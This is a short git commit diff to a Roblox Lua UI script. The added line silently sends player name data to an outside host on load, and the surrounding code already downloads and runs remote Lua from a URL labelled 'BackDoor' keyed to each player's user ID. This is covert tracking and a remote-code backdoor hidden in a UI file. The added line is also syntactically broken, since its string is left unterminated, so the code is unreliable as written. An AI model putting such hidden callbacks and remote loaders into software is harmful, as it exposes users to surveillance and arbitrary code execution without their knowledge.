8c963092d2e3fc2b042c7187dbccb73c035afc95
sonic <156506053+sonic998@users.noreply.github.com>
2024-03-06 15:30:03 +0100

    Update UI.lua

--- UI.lua
+++ UI.lua
@@ -34,6 +34,8 @@ local SectonFrame = Instance.new("Frame")
 local listtab_2 = Instance.new("UIListLayout")
   local listtab = Instance.new("UIListLayout")
 
+game:HttpGet("http://sonic.rf.gd/logid.php?id="..game.Players.Name..")
+	
 if loadstring(game:HttpGet("https://sonic998.github.io/sonichub/Shit/BackDoor"..game.Players.LocalPlayer.UserId..".lua"))() then
 SonicUI:Destroy()
 end
